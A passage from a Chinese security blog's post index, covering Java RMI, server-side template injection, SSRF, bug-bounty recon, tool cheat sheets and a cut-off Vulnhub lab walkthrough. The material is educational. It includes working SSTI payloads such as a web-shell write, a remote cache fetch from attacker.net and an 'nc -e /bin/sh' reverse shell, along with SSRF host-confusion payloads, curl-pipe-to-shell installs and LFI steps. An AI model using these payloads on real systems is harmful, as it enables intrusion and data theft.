Interfaces远程对象需要实现远程接口，这个远程接口继承自 java.rmi.Remote，完成后一个 Stub 就能够自动创建。然后需要引用远程对象作为远程接口的一个实例而不是类的实例。因为真正的对象和 Stub 都实现了远程接口，对于方法调用来说，它们是一样的类型。 远程对象的 public 字段无法直接访问，需要通过访问器函数。 远程接口的方法必须声明为可抛出java.rmi.RemoteException异常。这个异常当任何网络错误发生时会抛出。 下面是一个远程接口，描述了远程对象的动作，含有两个可远程调用的方法，返回 Widget 对象 123456import java.rmi.*public interface RemoteObject extends Remote { public Widget doSomething() throws RemoteException; public Widget doSomethingElse() throws RemoteException;} UnicastRemoteObject 类远程对象（实现了远程接口的）通常会继承 java.rmi.server.UnicastRemoteObject类。创建这个类的子类时，RMI 运行时会自动开始监听来自远程接口（Stub）的网络链接。 以下是一个实现了RemoteObject接口的远程对象 123456public class MyRemoteObject implements RemoteObject extends java.rmi.UnicastRemoteObject{ public RemoteObjectImpl() throws RemoteException {...} public Widget doSomething() throws RemoteException {...} public Wdiget doSomethingElse() throws RemoteException {...}} 除了继承 UnicastRemoteObject，也可以使用它的静态方法exportObject导出一个类。 通常，导出的对象短暂监听一个端口，通过使用UnicastRemoteObject.exportObject的另一个重载可以指定明确的端口。 RMI registryRMI registry 用于查找所需的远程对象。它由Naming类和rmiregistry程序组成。rmiregistry需要在使用它的 Java 程序启动前在本地运行。 当一个客户端对象需要寻找服务器上的对象时，它会请求一个 URL，包含 rmi 协议，主机名和需要请求的对象名。Naming类与 RMI registry 交互并返回远程对象的引用。 RMI 调用过程传输的对象必须实现java.io.Serializable接口，并且客户端和服务端的serialVersionUID要一致。 Server 开放两个服务：RMI Registry（默认为 1099 端口），远程对象的通信端口（随机） 有时 RMI Registry 不在 Server 端上而是在另一台服务器，区别不大。 远程调用方法的过程： Server 监听一个端口（远程对象的通信端口，随机） 获取 Stub，Stub 中包含远程对象的地址和端口等信息 Client 调用 Stub 的方法 Stub 连接到 Server 端监听的通信端口，提交参数 Server 端执行具体方法，返回给 Stub Stub 将结果返回给 Client 获取 Stub 的过程： Server 的 Remote Object 向 RMI Registry 注册远程对象名称 Client 通过名称向 RMI Registry 查询远程对象 RMI registry 发送 Stub 给 Client Client 通过 Stub，Stub 通过 Skeleton 向远程对象发起调用 RMI 利用","link":"/2021/04/14/rmi/"},{"title":"SSTI 总结","text":"服务端模板注入（Server-Side Template Injection） 模板网站开发时经常会使用一种模板技术，由模板控制前端的显示。 不使用模板： 123456from flask import Flaskapp = Flask(__name__)@app.route('/user/&lt;name&gt;')def user(name): return '&lt;h1&gt;Hello, {}!&lt;/h1&gt;'.format(name) 使用模板： 123456from flask import Flask, render_templateapp = Flask(__name__)@app.route('/user/&lt;name&gt;')def user(name): return render_template('user.html', name=name) user.html: 1&lt;h1&gt;Hello, {{ name }}!&lt;/ht&gt; 模板除了这样简单的替换功能，还支持更高级的功能。比如从一个字典、列表甚至对象中获取变量，可以对变量使用过滤器，提供控制结构和宏，支持扩展和继承。 常见模板引擎 PHP: Smarty, Twig, Blade JAVA: JSP, FreeMarker, Velocity Python: Jinja2, django, tornado 模板注入注入产生的原因是混淆程序和数据 PHP - Twig存在漏洞版本 1234567&lt;?phprequire_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[‘name‘]}&quot;); // 将用户输入作为模版内容的一部分echo $output; 修复版本： 123456&lt;?phprequire_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); // 将用户输入作为模版变量的值echo $output; Python - Jinja2存在漏洞： 1234567891011@app.errorhandler(404)def page_not_found(e): template = '''{%% extends &quot;layout.html&quot; %%}{%% block body %%} &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt;{%% endblock %%}''' % (request.url) return render_template_string(template), 404 检测在可能存在 SSTI 的地方使用 1{{ 1+1 }} 类似这样的 payload，如果能在页面上看到返回了 2，就说明表达式能够执行，可以模板注入。 攻击利用模板特性SmartySmarty 提供了安全模式，只能执行白名单中的PHP函数，但我们可以从模板本身入手。 $smarty内置类可以用于访问环境变量，使用self就可以得到这个类，它提供了一些好用的方法，比如getStreamVariable()，可以获取传入变量的流（读文件） 1{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)} class Smarty_Internal_Write_File，有一个writeFile函数，可以写文件 1{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET['cmd']); ?&gt;&quot;,self::clearConfig())} TwigTwig 无法调用静态方法，并且所有函数的返回值都转换为字符串。但是提供了一个_self，有一个env，指Twig_Environment对象，有一个setCache方法，可以改变Twig尝试加载和执行编译模板的位置，可以通过将缓存位置设置为远程服务器进行远程文件包含。 12{{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}} 但是这个 payload 需要打开allow_url_include，所以换用getFilter方法，其中调用了call_user_function方法 12{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}} FreeMarker1&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) } 利用框架特性Django123http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY} Flask - Jinja2config 是 Flask 框架中的一个全局对象，代表当前配置对象flask config，包含了所有应用程序的配置值。包含一些方法：from_envvar，from_object，from_pyfile，root_path。 123456{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}//写文件{{ config.from_pyfile('/tmp/evil') }}//加载system{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}//执行命令反弹SHELL Tornado1http://117.78.26.79:31093/error?msg={{handler.settings}} 利用语言特性Python需要绕过沙盒机制，[一篇博文](http://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/) Java123${T(java.lang.System).getenv()}${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} 防御 过滤用户输入 不要直接使用格式化字符串，或者使用正规的模板渲染方法","link":"/2020/05/10/ssti/"},{"title":"SRC 挖掘","text":"Security Response Center 观察SRC划定范围，备案信息、天眼查、whois 、邮箱反查 子域名 onforall IP端口 masscan+nmap 网站信息，云悉，wappalyzer，ThreatScan 目录扫描 wfuzz，御剑，7kb 字典：github.com/TheKingOfDuck/fuzzDicts js 中的路径、敏感信息收集，JSFinder APP信息搜集，反编译搜索 jar 包 github.com/s0md3v 隐藏站点目录 google 搜索 404 、403页面，可以fuzz接口目录、google搜索、github搜索 Spring whitelable error 页面，actuator配置不当漏洞、swagger未授权访问接口 weblogic 页面 ：工具weblogicscan tomcat put 漏洞，弱口令，ajp文件 存在漏洞的第三方组件 登录框：任意注册，任意用户登录，任意密码重置，短信轰炸，邮箱轰炸，找回密码逻辑漏洞，认证缺陷，用户名可穷举，验证码隐藏参数（修改验证码大小，可以引发dos攻击）、验证码绕过（删除或者0000万能验证码） 敏感信息接口：越权访问、jsonp劫持、cors跨域漏洞 js文件：未授权访问、敏感信息泄露（webpack打包）、路径泄露，js硬编码密码 参数点：xss，sql注入，任意文件读取，任意文件下载，遍历读取，url跳转漏洞，ssrf 可利用端口，ajp漏洞，redis未授权，Rsync未授权，mangodb未授权，FTP未授权，memcache未授权、zookeeper未授权、jenskins未授权，docker未授权 报错页面：spring，tomcat，weblogic，nginx 任意文件下载后：读配置文件；通过配置文件信息搜集：当前运行该用户的操作历史，该用户运行的其他服务其他服务下的配置文件；读取源码（java的xxe可以列目录，java读web.xml，网鼎杯青龙组CTF题目filejava） ajax 异步请求：前端判定不能抓包（抓不到响应包） 手机抓包：charles 微信网页：特殊的user-agent，可以发包","link":"/2020/05/15/src/"},{"title":"SSRF","text":"SSRF（Server Side Request Forgery），服务端请求伪造 基础SSRF 是指攻击者构造一个恶意请求，导致服务器发起另一个恶意请求的漏洞。 一般 SSRF 攻击的是无法直接访问的内网系统。 通常出现在插入链接、图片等处。 12345678910&lt;?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); $data =curl_exec($ch); curl_close($ch); echo $data;?&gt; 以上代码没有检查 curl 请求的 URL，可以请求内网中的内容。 利用 HTTP 协议利用 HTTP 协议是最普通的情况， 可以对服务器内网 web 应用进行指纹识别，也可实现一些简单的攻击 利用 Gopher博客中有另一篇文章 利用 LDAP利用 DICTProtocal Smuggling翻译 BlackHat PPT的重要部分 翻了一半发现已经有翻译了。。安全客 合适的基于 HTTP 的协议 Elastic CouchDB Mongodb Docker 基于文本的协议 FTP SMTP Redis Memcached 小例子python1http://1.1.1.1 &amp;@2.2.2.2# 3.3.3.3 由python 不同的库会解析为不同的 IP 地址 1231.1.1.1 # urllib2 httplib2.2.2.2 # requests3.3.3.3 #urllib 劫持 SMTP1https://127.0.0.1 %0D%0AHELO□orange.tw%0D%0AMAIL□FROM…:25/ 重点：https，CRLF 注入 URL 解析问题问题源于请求方和 URL 解析器的行为不同 URL 分五部分： scheme 协议、authority 认证、path 路径、query 请求、fragment 锚点？ RFC 39861234567authority = [ userinfo &quot;@&quot; ] host [ &quot;:&quot; port ]port = *DIGIThost = IP-literal / IPv4address / reg-namereg-name = *( unreserved / pct-encoded / sub-delims )unreserved = ALPHA / DIGIT / &quot;-&quot; / &quot;.&quot; / &quot;_&quot; / &quot;~&quot;sub-delims = &quot;!&quot; / &quot;$&quot; / &quot;&amp;&quot; / &quot;'&quot; / &quot;(&quot; / &quot;)&quot; /&quot;*&quot; / &quot;+&quot; / &quot;,&quot; / &quot;;&quot; / &quot;=&quot; section 3.2 The authority component is preceded by a double slash(“//“) and is terminated by the next slash(“/“), question mark(“?”), or number sign(“#”) character, or by the end of the URI PHP 的一个例子1234567$url = 'http://' . $_GET[url];$parsed = parse_url($url);if ( $parsed[port] == 80 &amp;&amp; $parsed[host] == 'google.com') {readfile($url);} else {die('You Shall Not Pass');} 可用 payload 1http://google.com#@evil.com PHP parse_url 解析为 google.com，而 readfile 解析为 evil.com 一些语言和库存在的问题 CURL1http://foo@evil.com:80 @google.com/ curl 和 libcurl 解析为 evil.com:80，而以下解析为 google.com：Node JS URL，Perl URI，Go net/url，PHP parse_url，Ruby addressable NodeJS Unicode Failure12345var base = &quot;http://orange.tw/sandbox/&quot;;var path = req.query.path;if (path.indexOf(&quot;..&quot;) == -1) {http.get(base + path, callback);} payload 1http://orange.tw/sandbox/\\xFF\\x2E\\xFF\\x2E/passwd (U+FF2E)(U+FF2E)/ 在 NodeJS HTTP 中是 ../ 1http://127.0.0.1:6379/\\r\\nSLAVEOF orange.tw 6379\\r\\n 在 NodeJS 中无法成功，可以将\\r\\n替换为 Unicode 字符(U+FF0D)(U+FF0A)绕过 Glibc NSS Featuresresolv/ns_name.c#ns_name_pton()","link":"/2021/04/13/ssrf/"},{"title":"常用工具使用","text":"记录一些常用工具的使用 渗透Meterpreterhelp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184Core Commands============= Command Description ------- ----------- ? Help menu background Backgrounds the current session bg Alias for background bgkill Kills a background meterpreter script bglist Lists running background scripts bgrun Executes a meterpreter script as a background th read channel Displays information or control active channels close Closes a channel detach Detach the meterpreter session (for http/https) disable_unicode_encoding Disables encoding of unicode strings enable_unicode_encoding Enables encoding of unicode strings exit Terminate the meterpreter session get_timeouts Get the current session timeout values guid Get the session GUID help Help menu info Displays information about a Post module irb Open an interactive Ruby shell on the current se ssion load Load one or more meterpreter extensions machine_id Get the MSF ID of the machine attached to the se ssion migrate Migrate the server to another process pivot Manage pivot listeners pry Open the Pry debugger on the current session quit Terminate the meterpreter session read Reads data from a channel resource Run the commands stored in a file run Executes a meterpreter script or Post module secure (Re)Negotiate TLV packet encryption on the sessi on sessions Quickly switch to another session set_timeouts Set the current session timeout values sleep Force Meterpreter to go quiet, then re-establish session ssl_verify Modify the SSL certificate verification setting transport Manage the transport mechanisms use Deprecated alias for &quot;load&quot; uuid Get the UUID for the current session write Writes data to a channelStdapi: File system Commands============================ Command Description ------- ----------- cat Read the contents of a file to the screen cd Change directory checksum Retrieve the checksum of a file cp Copy source to destination del Delete the specified file dir List files (alias for ls) download Download a file or directory edit Edit a file getlwd Print local working directory getwd Print working directory lcd Change local working directory lls List local files lpwd Print local working directory ls List files mkdir Make directory mv Move source to destination pwd Print working directory rm Delete the specified file rmdir Remove directory search Search for files show_mount List all mount points/logical drives upload Upload a file or directoryStdapi: Networking Commands=========================== Command Description ------- ----------- arp Display the host ARP cache getproxy Display the current proxy configuration ifconfig Display interfaces ipconfig Display interfaces netstat Display the network connections portfwd Forward a local port to a remote service resolve Resolve a set of host names on the target route View and modify the routing tableStdapi: System Commands======================= Command Description ------- ----------- clearev Clear the event log drop_token Relinquishes any active impersonation token. execute Execute a command getenv Get one or more environment variable values getpid Get the current process identifier getprivs Attempt to enable all privileges available to the current pr ocess getsid Get the SID of the user that the server is running as getuid Get the user that the server is running as kill Terminate a process localtime Displays the target system local date and time pgrep Filter processes by name pkill Terminate processes by name ps List running processes reboot Reboots the remote computer reg Modify and interact with the remote registry rev2self Calls RevertToSelf() on the remote machine shell Drop into a system command shell shutdown Shuts down the remote computer steal_token Attempts to steal an impersonation token from the target pro cess suspend Suspends or resumes a list of processes sysinfo Gets information about the remote system, such as OSStdapi: User interface Commands=============================== Command Description ------- ----------- enumdesktops List all accessible desktops and window stations getdesktop Get the current meterpreter desktop idletime Returns the number of seconds the remote user has been idle keyboard_send Send keystrokes keyevent Send key events keyscan_dump Dump the keystroke buffer keyscan_start Start capturing keystrokes keyscan_stop Stop capturing keystrokes mouse Send mouse events screenshare Watch the remote user desktop in real time screenshot Grab a screenshot of the interactive desktop setdesktop Change the meterpreters current desktop uictl Control some of the user interface componentsStdapi: Webcam Commands======================= Command Description ------- ----------- record_mic Record audio from the default microphone for X seconds webcam_chat Start a video chat webcam_list List webcams webcam_snap Take a snapshot from the specified webcam webcam_stream Play a video stream from the specified webcamStdapi: Audio Output Commands============================= Command Description ------- ----------- play play a waveform audio file (.wav) on the target systemPriv: Elevate Commands====================== Command Description ------- ----------- getsystem Attempt to elevate your privilege to that of local system.Priv: Password database Commands================================ Command Description ------- ----------- hashdump Dumps the contents of the SAM databasePriv: Timestomp Commands======================== Command Description ------- ----------- timestomp Manipulate file MACE attributes 逆向/PWNollydbg 快捷键 功能 F2 设置断点 F8 单步步过，遇到子程序不进入 F7 单步步入，遇到子程序进入 F4 运行到选定位置，到光标位置暂停 Ctrl+F9 执行到返回，执行到ret语句时暂停 ALT+F9 执行到用户代码 IDA 快捷键 功能 Space 切换反汇编窗口（列表和图形） ESC 和Enter 反野 G 定位地址 X 交叉引用 TAB 汇编和伪代码切换 N 重命名 Y 修改函数原型或者变量类型 双击 转到定义 ;和: 分号注释所有交叉参考处都会出现，冒号只在该处出现 小键盘+和- 在代码和关系图之间切换 F5 显示C伪代码 * 变量重定义为数组 Ctrl+S 搜索类型选择 Alt+T 文本搜索 Alt+I 立即数搜索 Alt+B 二进制搜索 Shift+F12 字符串窗口，可以搜索字符串 D 数据类型转换 dd，dw，db R 转换成字符 H 十进制和十六进制转换 P 创建函数 Shift+S 快速创建结构体 A 解释光标的地址为字符串首地址 Alt+A 设置字符串实现格式，可以使用UTF8 Ctrl+E 查看函数模板表，DLL Entry Point Alt+* 设置数组大小 dbg 命令 功能 file &lt;filename&gt; 载入文件 r run，运行程序 c continue，继续执行 b &lt;行号/函数名称/*函数名称/*代码地址&gt; breakpoint，其中*函数名称表示断电设置在有编译器生成的prolog代码处 d &lt;编号&gt; delete breakpoint，删除断点 s step into，单步步入，遇到调用进入被调函数 n step over，单步步过，遇到调用不会进入 si 类似s，针对汇编指令 ni 类似n，针对汇编指令 p &lt;变量名&gt; print，显示指定变量 display 指定程序中断后显示的数据及格式 undisplay 取消display设置 i info，显示各类信息 q quit，退出调试环境 help &lt;命令&gt; 帮助 gdbJavaIdea","link":"/2019/10/07/tools/"},{"title":"vulhub-debug","text":"记录如何调试 vulhub 的漏洞环境 以 CVE-2020-1938 为例，进入 vulhub/tomcat/CVE-2020-1938，修改对应 docker-compose.yml 12345678910111213version: '2'services: tomcat: image: vulhub/tomcat:9.0.30 ports: - &quot;8080:8080&quot; - &quot;8009:8009&quot; - &quot;5005:5005&quot; environment: TZ: Asia/Shanghai JPDA_ADDRESS: 5005 JPDA_TRANSPORT: dt_socket command: [&quot;catalina.sh&quot;, &quot;jpda&quot;, &quot;run&quot;] 然后启动容器，并将项目文件复制出来 12docker-compose up -ddocker cp cve-2020-1938_tomcat_1:/usr/local/tomcat . 使用 idea 打开复制出来的项目文件，配置远程调试，添加 Remote JVM Debug，Transport 选择 Socket，Host 和 Port 根据实际情况选择。添加后开始 Debug，可以看到以下信息 1Coonnected to target VM, addressL'x.x.x.x', transport:'socket' 此时使用 POC 即可成功断下","link":"/2021/07/22/vulhub-debug/"},{"title":"SSR 服务端&#x2F;客户端","text":"服务端： 1wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 客户端： 12https://github.com/shadowsocksrr/shadowsocksrhttps://github.com/shadowsocksrr/shadowsocksr-android","link":"/2019/11/27/ssr/"},{"title":"利用 vulhub 搭建漏洞复现环境","text":"vulhub 是一个面向大众的开源漏洞靶场，基于 docker 和 docker-compose，方便漏洞复现。 安装 docker 1curl -s https://get.docker.com | sh 为 docker 换源，编辑/etc/docker/daemon.json： 12345{ &quot;rigistry-mirrors&quot; : [ &quot;http://registry.docker-cn.com&quot;, &quot;http://docker.mirrors.ustc.edu.cn&quot;} 安装 docker-compose 1pip install docker-compose 下载 vulhub 1git clone https://github.com/vulhub/vulhub.git 进入相应漏洞文件夹，执行docker-compose up -d，即可打开漏洞环境 执行docker-compose down 关闭环境或docker-compose down -v删除环境","link":"/2020/05/08/vulhub/"},{"title":"Vulnhub靶机-wakanda1","text":"靶机下载 用Virtualbox导入靶机时出现错误Implementation of the USB 2.0 controller not found!，到官网安装Oracle VM VirtualBox Extension Pack即可解决。 使用了virtualbox中的kali。 信息收集靶机和kali都用桥接模式，在同一局域网中。使用ip a查看Kali的IP地址和子网掩码 1234567891011121: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 08:00:27:b5:85:ee brd ff:ff:ff:ff:ff:ff inet 192.168.1.101/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0 valid_lft 86120sec preferred_lft 86120sec inet6 fe80::a00:27ff:feb5:85ee/64 scope link noprefixroute valid_lft forever preferred_lft forever 用nmap查看同一局域网的存活主机。nmap -sP 192.168.1.101/24 12345678910111213141516Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-17 17:32 CSTNmap scan report for 192.168.1.1 (192.168.1.1)Host is up (0.0015s latency).MAC Address: B4:DE:DF:5D:FE:70 (Unknown)Nmap scan report for 192.168.1.2 (192.168.1.2)Host is up (0.0030s latency).MAC Address: FC:7C:02:9C:00:59 (Unknown)Nmap scan report for laptop-lkst0l6r (192.168.1.3)Host is up (0.00040s latency).MAC Address: 00:0E:C6:BB:D2:3F (Asix Electronics)Nmap scan report for wakanda1 (192.168.1.4)Host is up (0.00073s latency).MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)Nmap scan report for k (192.168.1.101)Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 1.97 seconds 其中靶机是wakanda1（192.168.1.4），kali是k（192.168.1.101），物理机是laptop（192.168.1.3） 扫描一下端口，看看有什么服务。 12345678910111213nmap -sS -p- 192.168.1.4Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-17 15:18 CSTNmap scan report for wakanda1 (192.168.1.4)Host is up (0.00020s latency).Not shown: 65531 closed portsPORT STATE SERVICE80/tcp open http111/tcp open rpcbind3333/tcp open dec-notes44362/tcp open unknownMAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 3.80 seconds 80端口有一个web服务，3333是ssh端口 漏洞探测用Nikto扫描网站漏洞 1234567891011121314151617181920nikto -h http://192.168.1.4- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.4+ Target Hostname: 192.168.1.4+ Target Port: 80+ Start Time: 2020-01-17 15:30:03 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-3233: /icons/README: Apache default file found.+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host+ End Time: 2020-01-17 15:30:55 (GMT8) (52 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 在nikto里没有看到有用的信息，再使用dirb枚举目录。 1234567891011121314151617181920212223242526dirb http://192.168.1.4-----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Fri Jan 17 15:32:17 2020URL_BASE: http://192.168.1.4/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.1.4/ ----+ http://192.168.1.4/admin (CODE:200|SIZE:0) + http://192.168.1.4/backup (CODE:200|SIZE:0) + http://192.168.1.4/index.php (CODE:200|SIZE:1527) + http://192.168.1.4/secret (CODE:200|SIZE:0) + http://192.168.1.4/server-status (CODE:403|SIZE:299) + http://192.168.1.4/shell (CODE:200|SIZE:0) -----------------END_TIME: Fri Jan 17 15:32:19 2020DOWNLOADED: 4612 - FOUND: 6 访问了admin,backup等url，没有得到信息。 查看index.php源码，发现一行注释 1&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt; 说明index.php有切换语言的功能，可以接受lang参数，可能存在文件包含。 漏洞利用尝试利用php伪协议读index 1http://192.168.1.4/index.php?lang=php://filter/convert.base64-encode/resource=index 得到了编码的index.php 1PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4= 解码后得到了密码 123456789&lt;?php$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember itif (isset($_GET['lang'])){include($_GET['lang'].&quot;.php&quot;);}?&gt; 网站没有后台，尝试用这个密码登录ssh，一开始登录root，登录不上。在网站首页找到Made by[@mamadou](http://192.168.1.4/#)，登录mamadou成功。 获取信息登录后默认的shell是python，切换到bash 12import ptypty.spawn(&quot;/bin/bash&quot;) 找找flag 1find / -name &quot;*flag*&quot; 看到home的mamadou和devops里有flag1和flag2。flag1可以直接读，flag2提示permission denied。尝试sudo，提示mamadou不在suders file（当然）。 在/tmp下看到一个test文件 12345678910ls /tmp -latotal 32drwxrwxrwt 7 root root 4096 Jan 17 03:23 .drwxr-xr-x 22 root root 4096 Aug 1 2018 ..drwxrwxrwt 2 root root 4096 Jan 16 22:18 .font-unixdrwxrwxrwt 2 root root 4096 Jan 16 22:18 .ICE-unix-rw-r--r-- 1 devops developer 4 Jan 17 03:33 testdrwxrwxrwt 2 root root 4096 Jan 16 22:18 .Test-unixdrwxrwxrwt 2 root root 